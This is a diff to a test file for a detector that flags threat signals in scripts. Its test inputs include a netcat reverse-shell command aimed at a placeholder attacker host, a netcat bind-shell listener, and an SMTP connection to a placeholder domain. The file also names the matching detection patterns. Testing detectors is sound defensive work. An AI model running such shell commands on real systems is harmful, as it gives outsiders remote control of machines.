@@ -44,13 +44,24 @@ describe("collectThreatSignals", () => {
     expect(signals.some((s) => s.pattern === "file-upload-sink")).toBe(true);
   });
 
-  it("records line numbers and deduplicates identical signals", () => {
+  it("records each line occurrence separately", () => {
     const signals = collectThreatSignals(
       "nc -e /bin/sh evil.example 4444\nnc -e /bin/sh evil.example 4444\n",
       "a.sh"
     );
 
-    expect(signals.filter((s) => s.pattern === "reverse-shell-nc")).toHaveLength(1);
-    expect(signals.find((s) => s.pattern === "reverse-shell-nc")?.line).toBe(1);
+    const ncSignals = signals.filter((s) => s.pattern === "reverse-shell-nc");
+    expect(ncSignals).toHaveLength(2);
+    expect(ncSignals.map((s) => s.line)).toEqual([1, 2]);
+  });
+
+  it("detects bind shells and bulk email", () => {
+    const signals = collectThreatSignals(
+      "nc -lvnp 4444\nimport smtplib\nsmtplib.SMTP('smtp.evil.example')\n",
+      "s.sh"
+    );
+
+    expect(signals.some((s) => s.pattern === "bind-shell")).toBe(true);
+    expect(signals.some((s) => s.pattern === "bulk-email")).toBe(true);
   });
 });
